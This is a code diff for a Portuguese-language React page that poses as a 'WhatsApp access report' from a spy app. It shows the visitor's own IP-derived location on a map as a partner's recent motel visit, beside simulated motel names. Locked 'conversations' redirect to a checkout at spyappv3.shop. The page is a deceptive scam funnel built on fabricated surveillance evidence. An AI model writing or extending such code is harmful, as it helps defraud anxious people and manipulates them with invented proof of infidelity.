@@ -2,6 +2,7 @@ import { useState, useEffect } from "react";
 import { useLocation } from "wouter";
 import { MessageCircle, X, Lock, MessageSquare, Music, Image as ImageIcon, MapPin } from "lucide-react";
 import { Button } from "@/components/ui/button";
+import MapView from "@/components/Map";
 
 interface Conversation {
   id: string;
@@ -35,7 +36,6 @@ export default function Relatorio() {
   const [loadingLocation, setLoadingLocation] = useState(true);
 
   useEffect(() => {
-    // Fetch user's IP and location
     const fetchLocation = async () => {
       try {
         const response = await fetch('https://ipapi.co/json/');
@@ -52,7 +52,6 @@ export default function Relatorio() {
         
         setLocationData(location);
         
-        // Simulate finding a nearby motel
         const motels = [
           { name: "Motel Paraíso", distance: "2.3 km", rating: "4.5" },
           { name: "Motel Luxo", distance: "3.1 km", rating: "4.2" },
@@ -128,13 +127,11 @@ export default function Relatorio() {
   ];
 
   const handleUnlock = (section: string) => {
-    // Redirect to payment page
     window.location.href = "https://checkout.spyappv3.shop/VCCL1O8SCG0D";
   };
 
   return (
     <div className="min-h-screen bg-gradient-to-b from-green-500 to-green-600 flex flex-col">
-      {/* Header */}
       <header className="bg-green-500 py-4 px-3 sm:py-6 sm:px-4 text-white">
         <div className="max-w-4xl mx-auto">
           <h1 className="text-xl sm:text-2xl font-bold">Relatório de Acesso ao WhatsApp</h1>
@@ -144,10 +141,8 @@ export default function Relatorio() {
         </div>
       </header>
 
-      {/* Main Content */}
       <main className="flex-1 px-3 py-4 sm:px-4 sm:py-8">
         <div className="max-w-4xl mx-auto space-y-4 sm:space-y-6">
-          {/* Análise de Conversas */}
           <div className="bg-white rounded-lg p-4 sm:p-6 shadow-lg">
             <div className="flex items-center gap-2 mb-3 sm:mb-4">
               <MessageSquare className="w-4 h-4 sm:w-5 sm:h-5 text-green-500" />
@@ -187,7 +182,6 @@ export default function Relatorio() {
             </div>
           </div>
 
-          {/* Mídia Recuperada */}
           <div className="bg-white rounded-lg p-4 sm:p-6 shadow-lg">
             <div className="flex items-center gap-2 mb-3 sm:mb-4">
               <ImageIcon className="w-4 h-4 sm:w-5 sm:h-5 text-green-500" />
@@ -236,7 +230,6 @@ export default function Relatorio() {
             </div>
           </div>
 
-          {/* Palavras-chave Suspeitas */}
           <div className="bg-white rounded-lg p-4 sm:p-6 shadow-lg">
             <h2 className="text-lg sm:text-xl font-bold text-gray-800 mb-3 sm:mb-4">Palavras-chave Suspeitas</h2>
             <p className="text-gray-700 mb-3 sm:mb-4 text-sm sm:text-base">
@@ -265,48 +258,33 @@ export default function Relatorio() {
             </Button>
           </div>
 
-          {/* Localização Suspeita */}
           <div className="bg-white rounded-lg p-4 sm:p-6 shadow-lg">
-            <h2 className="text-lg sm:text-xl font-bold text-gray-800 mb-3 sm:mb-4">Localização Suspeita</h2>
+            <div className="flex items-center gap-2 mb-3 sm:mb-4">
+              <MapPin className="w-4 h-4 sm:w-5 sm:h-5 text-green-500" />
+              <h2 className="text-lg sm:text-xl font-bold text-gray-800">Localização Suspeita</h2>
+            </div>
             <p className="text-gray-700 mb-3 sm:mb-4 text-sm sm:text-base">
-              O número esteve neste motel nos últimos 7 dias.
+              O número esteve neste motel nos últimos 7 dias. Abaixo está a localização mais recente registrada.
             </p>
 
             {loadingLocation ? (
-              <div className="w-full h-40 bg-gray-200 rounded-lg mb-3 sm:mb-4 flex items-center justify-center text-gray-400">
+              <div className="w-full h-80 bg-gray-200 rounded-lg mb-3 sm:mb-4 flex items-center justify-center text-gray-400">
                 <div className="text-center">
                   <div className="animate-spin mb-2">⏳</div>
-                  <p className="text-sm">Localizando...</p>
+                  <p className="text-sm">Carregando mapa...</p>
                 </div>
               </div>
             ) : locationData ? (
-              <div className="w-full bg-gradient-to-br from-green-50 to-blue-50 rounded-lg p-3 sm:p-4 mb-3 sm:mb-4 border border-green-200 space-y-2 sm:space-y-3">
-                <div className="flex items-start gap-2">
-                  <MapPin className="w-4 h-4 sm:w-5 sm:h-5 text-red-500 flex-shrink-0 mt-0.5" />
-                  <div className="min-w-0">
-                    <p className="text-xs sm:text-sm text-gray-600">Localização Detectada</p>
-                    <p className="font-semibold text-gray-800 text-sm sm:text-base">{locationData.city}, {locationData.state}</p>
-                  </div>
-                </div>
-                
-                <div className="bg-white rounded p-2 sm:p-3 border border-gray-200">
-                  <p className="text-xs text-gray-500 mb-1">IP Detectado</p>
-                  <p className="font-mono text-xs sm:text-sm font-bold text-gray-800 break-all">{locationData.ip}</p>
-                </div>
-                
-                {motelData && (
-                  <div className="bg-white rounded p-2 sm:p-3 border border-orange-200">
-                    <p className="text-xs text-gray-500 mb-1">🏨 Motel Próximo</p>
-                    <p className="font-semibold text-gray-800 text-sm">{motelData.name}</p>
-                    <div className="flex justify-between text-xs text-gray-600 mt-1">
-                      <span>📍 {motelData.distance}</span>
-                      <span>⭐ {motelData.rating}</span>
-                    </div>
-                  </div>
-                )}
+              <div className="w-full rounded-lg mb-3 sm:mb-4 overflow-hidden shadow-md border border-gray-200">
+                <MapView
+                  lat={locationData.latitude}
+                  lng={locationData.longitude}
+                  zoom={15}
+                  motelName={motelData?.name || "Motel Próximo"}
+                />
               </div>
             ) : (
-              <div className="w-full h-40 bg-gray-200 rounded-lg mb-3 sm:mb-4 flex items-center justify-center text-gray-400">
+              <div className="w-full h-80 bg-gray-200 rounded-lg mb-3 sm:mb-4 flex items-center justify-center text-gray-400">
                 <Lock className="w-6 h-6 sm:w-8 sm:h-8" />
               </div>
             )}
@@ -319,12 +297,10 @@ export default function Relatorio() {
             </Button>
           </div>
 
-          {/* Main Unlock Button */}
           <div className="h-20 sm:h-24"></div>
         </div>
       </main>
 
-      {/* Sticky Unlock Button */}
       <div className="fixed bottom-0 left-0 right-0 bg-white border-t border-gray-200 p-3 sm:p-4">
         <Button
           onClick={() => handleUnlock("tudo")}
@@ -334,11 +310,9 @@ export default function Relatorio() {
         </Button>
       </div>
 
-      {/* Conversation Modal */}
       {selectedConversation && (
         <div className="fixed inset-0 bg-black bg-opacity-50 flex items-end sm:items-center justify-center p-0 sm:p-4 z-50">
           <div className="bg-white rounded-t-lg sm:rounded-lg max-w-md w-full max-h-96 flex flex-col sm:max-h-96">
-            {/* Modal Header */}
             <div className="flex items-center justify-between p-3 sm:p-4 border-b">
               <div className="min-w-0">
                 <p className="font-semibold text-gray-800 text-sm sm:text-base">{selectedConversation.number}</p>
@@ -348,11 +322,10 @@ export default function Relatorio() {
                 onClick={() => setSelectedConversation(null)}
                 className="text-gray-400 hover:text-gray-600 p-1 flex-shrink-0"
               >
-                <X className="w-4 h-4 sm:w-5 sm:h-5" />
+                <X className="w-5 h-5" />
               </button>
             </div>
 
-            {/* Modal Content */}
             <div className="flex-1 overflow-y-auto p-3 sm:p-4 space-y-2 sm:space-y-3">
               {selectedConversation.messages?.map((msg, i) => (
                 <div
@@ -360,31 +333,34 @@ export default function Relatorio() {
                   className={`flex ${msg.sender === "you" ? "justify-end" : "justify-start"}`}
                 >
                   <div
-                    className={`max-w-xs px-2 sm:px-3 py-2 rounded-lg text-xs sm:text-sm ${
+                    className={`max-w-xs px-3 py-2 rounded-lg text-sm ${
                       msg.blocked
-                        ? "bg-gray-200 text-gray-500 italic"
+                        ? "bg-gray-300 text-gray-600"
                         : msg.sender === "you"
                         ? "bg-green-500 text-white"
-                        : "bg-gray-100 text-gray-800"
+                        : "bg-gray-200 text-gray-800"
                     }`}
                   >
-                    <p>{msg.text}</p>
+                    {msg.blocked ? (
+                      <div className="flex items-center gap-1">
+                        <Lock className="w-3 h-3" />
+                        <span>{msg.text}</span>
+                      </div>
+                    ) : (
+                      msg.text
+                    )}
                     <p className="text-xs opacity-70 mt-1">{msg.time}</p>
                   </div>
                 </div>
               ))}
             </div>
 
-            {/* Modal Footer */}
             <div className="border-t p-3 sm:p-4">
               <Button
-                onClick={() => {
-                  setSelectedConversation(null);
-                  handleUnlock("conversas");
-                }}
-                className="w-full bg-green-500 hover:bg-green-600 text-white font-bold py-2 rounded-lg text-sm sm:text-base"
+                onClick={() => handleUnlock("conversa")}
+                className="w-full bg-green-500 hover:bg-green-600 text-white font-bold py-2 rounded-lg text-sm"
               >
-                🔓 DESBLOQUEAR
+                🔓 DESBLOQUEAR CONVERSA COMPLETA
               </Button>
             </div>
           </div>
